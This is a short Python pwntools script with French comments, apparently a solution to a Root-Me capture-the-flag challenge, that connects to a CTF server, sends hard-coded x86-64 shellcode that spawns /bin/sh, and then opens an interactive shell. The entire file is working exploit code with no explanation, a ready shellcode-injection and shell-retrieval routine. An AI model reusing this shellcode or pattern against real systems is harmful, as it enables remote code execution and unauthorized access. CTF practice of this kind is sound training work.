from pwn import *

#Shellcode
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

serv = remote('ctf10k.root-me.org', 5004)

#Affichage de la premier ligne envoyé par le serveur
print(serv.recvline())

#Envoi du shellcode
serv.send(sc)

#Recupération du shell
serv.interactive()



